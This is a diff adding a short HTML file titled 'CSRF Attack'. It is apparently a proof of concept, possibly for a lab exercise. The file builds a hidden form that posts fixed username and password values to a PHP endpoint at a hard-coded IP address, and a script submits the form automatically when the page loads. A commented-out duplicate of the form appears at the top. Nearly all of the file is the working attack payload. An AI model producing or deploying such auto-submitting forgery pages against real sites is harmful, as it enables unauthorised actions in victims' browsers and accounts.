@@ -1,0 +1,31 @@
+<!-- 
+  <form method="post
+action="http://138.197.173.235/csfr.php">
+<input type="hidden" name="username" value="host"/>
+<input type="hidden" name="password" value="pass"/>
+<input type="hidden" name="btnSubmit" value="Submit"/>
+
+</form>
+
+
+<script>
+document.forms[0].submit();
+</script> -->
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>CSRF Attack</title>
+</head>
+<body>
+    <form id="csrfForm" method="post" action="http://138.197.173.235/csfr.php">
+        <input type="hidden" name="username" value="host">
+        <input type="hidden" name="password" value="pass">
+        <input type="hidden" name="btnSubmit" value="Submit"/>
+    </form>
+
+    <script>
+        document.getElementById("csrfForm").submit();
+    </script>
+</body>
+</html>
